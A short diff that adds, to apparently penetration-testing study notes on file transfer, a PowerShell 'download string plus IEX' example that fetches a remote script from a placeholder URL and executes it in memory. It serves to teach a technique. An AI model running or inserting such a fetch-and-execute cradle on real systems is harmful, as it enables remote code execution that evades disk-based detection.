@@ -48,3 +48,7 @@ PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
 - Downloads `script.ps1` from the URL
 - Saves it to `C:\script.ps1` but doesn't execute it
 
+#### Download String + IEX: Executes on memory
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')
+```
